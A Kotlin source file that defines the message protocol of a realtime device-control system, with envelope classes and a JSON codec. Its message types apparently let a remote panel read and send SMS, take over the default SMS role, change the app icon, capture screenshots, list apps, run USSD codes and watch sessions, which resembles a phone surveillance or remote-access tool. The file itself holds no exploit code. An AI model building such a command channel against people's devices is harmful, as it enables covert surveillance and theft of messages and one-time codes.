package com.base.realtime.protocol

import java.util.UUID
import kotlinx.serialization.ExperimentalSerializationApi
import kotlinx.serialization.Serializable
import kotlinx.serialization.decodeFromString
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonElement
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

object Protocol {
    const val VERSION = 1
    const val TYPE_HELLO = "hello"
    const val TYPE_ACK = "ack"
    const val TYPE_PING = "ping"
    const val TYPE_PONG = "pong"
    const val TYPE_PRESENCE = "presence"
    const val TYPE_ERROR = "error"
    const val TYPE_LOG = "log"
    const val TYPE_DEVICE_GRANTS = "device.grants"
    const val TYPE_DEVICE_SCREEN = "device.screen"
    const val TYPE_PANEL_PING = "panel.ping"
    const val TYPE_PANEL_ICON = "panel.icon"
    const val TYPE_PANEL_SMS_SYNC = "panel.sms.sync"
    const val TYPE_PANEL_SMS_SEND = "panel.sms.send"
    const val TYPE_PANEL_SMS_DEFAULT = "panel.sms.default"
    const val TYPE_PANEL_OFFMODE = "panel.offmode"
    const val TYPE_PANEL_OFFMODE_POLICY = "panel.offmode.policy"
    const val TYPE_DEVICE_SMS = "device.sms"
    const val TYPE_PANEL_SCREENSHOT = "panel.screenshot"
    const val TYPE_PANEL_APPS_SYNC = "panel.apps.sync"
    const val TYPE_PANEL_USSD = "panel.ussd"
    const val TYPE_PANEL_WATCH = "panel.watch"
    const val TYPE_PANEL_RESULT = "panel.result"
    const val TYPE_WATCH_SESSION = "watch.session"
    const val TYPE_SMS_BATCH = "sms.batch"
    const val TYPE_APPS_BATCH = "apps.batch"
    const val TYPE_AI_UI_GUIDE_REQUEST = "ai.ui.guide.request"
    const val TYPE_AI_UI_GUIDE = "ai.ui.guide"
    const val TYPE_AI_UI_GUIDE_RESULT = "ai.ui.guide.result"
    const val PORT_LEN = 20

    val RESERVED = setOf(TYPE_HELLO, TYPE_ACK, TYPE_PING, TYPE_PONG, TYPE_PRESENCE, TYPE_ERROR)
    val IDENTITY = Regex("^[A-Za-z0-9._:-]{1,64}$")
    val PORT = Regex("^[A-Za-z0-9]{$PORT_LEN}$")

    fun requiresAck(type: String): Boolean = type !in setOf(TYPE_ACK, TYPE_PING, TYPE_PONG, TYPE_ERROR)

    fun hello(
        id: String,
        userId: String,
        deviceId: String,
        fcmToken: String = "",
        port: String = "",
        install: Boolean = false,
        client: JsonObject? = null,
        grants: List<String> = emptyList(),
        screen: JsonObject? = null,
    ): Envelope = Envelope(
        id = id,
        type = TYPE_HELLO,
        ts = System.currentTimeMillis(),
        payload = buildJsonObject {
            put("userId", userId)
            put("deviceId", deviceId)
            if (fcmToken.isNotBlank()) put("fcmToken", fcmToken)
            if (PORT.matches(port)) put("port", port)
            if (install) put("install", true)
            if (client != null && client.isNotEmpty()) put("client", client)
            if (grants.isNotEmpty()) {
                put("grants", buildJsonArray { grants.forEach { add(it) } })
            }
            if (screen != null) put("screen", screen)
        },
    )

    fun ack(ref: String): Envelope = Envelope(
        id = UUID.randomUUID().toString(),
        type = TYPE_ACK,
        ts = System.currentTimeMillis(),
        ref = ref,
    )

    fun pong(ref: String): Envelope = Envelope(
        id = UUID.randomUUID().toString(),
        type = TYPE_PONG,
        ts = System.currentTimeMillis(),
        ref = ref,
    )

    fun message(type: String, payload: JsonElement): Envelope = Envelope(
        id = UUID.randomUUID().toString(),
        type = type,
        ts = System.currentTimeMillis(),
        payload = payload,
    )

    fun panelResult(
        ref: String,
        ok: Boolean,
        iconState: String = "",
        error: String = "",
        count: Int = 0,
        text: String = "",
    ): Envelope = Envelope(
        id = UUID.randomUUID().toString(),
        type = TYPE_PANEL_RESULT,
        ts = System.currentTimeMillis(),
        ref = ref,
        payload = buildJsonObject {
            put("ok", ok)
            if (iconState.isNotBlank()) put("iconState", iconState)
            if (error.isNotBlank()) put("error", error)
            if (count > 0) put("count", count)
            if (text.isNotBlank()) put("text", text)
        },
    )
}

@Serializable
data class Envelope(
    val v: Int = Protocol.VERSION,
    val id: String,
    val type: String,
    val ts: Long,
    val ref: String? = null,
    val payload: JsonElement? = null,
)

@Serializable
data class PresencePayload(
    val userId: String,
    val deviceId: String,
    val online: Boolean,
    val lastSeen: Long,
)

@Serializable
data class ErrorPayload(val message: String = "")

object Codec {
    @OptIn(ExperimentalSerializationApi::class)
    val json = Json {
        ignoreUnknownKeys = true
        encodeDefaults = true
        explicitNulls = false
    }

    fun encode(envelope: Envelope): String = json.encodeToString(envelope)

    fun decode(text: String): Envelope = json.decodeFromString(text)
}
